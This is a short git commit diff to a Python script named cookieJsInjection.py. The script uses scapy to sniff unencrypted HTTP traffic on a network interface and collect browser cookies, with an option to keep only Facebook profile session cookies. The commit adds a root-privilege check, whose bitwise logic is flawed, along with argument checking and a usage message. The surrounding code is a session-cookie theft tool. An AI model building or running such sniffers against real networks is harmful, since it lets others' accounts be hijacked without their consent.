a10ad706a9cdc949c30b622ca1d94b251c851230
Diogo Mónica <diogomonica@hybrid.local>
2011-01-05 14:09:20 +0000

    Added verification for root privileges, mandatory arguments check and printUsage

--- cookieJsInjection.py
+++ cookieJsInjection.py
@@ -1,9 +1,13 @@
 #!/usr/bin/env python
 
-import sys
+import sys, os
 from scapy.all import *
 cookies_seen =()
 
+def isRoot():
+	"""Verifies if the current user is root"""
+	return os.getuid() & os.getgid() == 0
+	
 def dictStringValue(raw_values):
 	value = raw_values.split('=')
 	return {value[0].strip():value[1].strip()}
@@ -47,6 +51,18 @@ def sniffCookies(p):
 			cookies_seen = cookies_seen + (cookie["c_user"],)
 		cookies_seen = cookies_seen + (cookie,)
 
-if __name__ == "__main__":						 		
-	interface = sys.argv[1]	   
+def printUsage():
+	print "Usage: %s <-f> IFACE" % sys.argv[0]
+	
+if __name__ == "__main__":
+	if len(sys.argv) < 2:
+		printUsage()
+		sys.exit(0)
+		
+	if not isRoot():
+		print "[-] Your have to be root to sniff interfaces"
+		sys.exit(0)
+									 		
+	interface = sys.argv[1]
+	if "-f" in sys.argv: print "[+] Printing facebook profile cookies only"
 	sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)
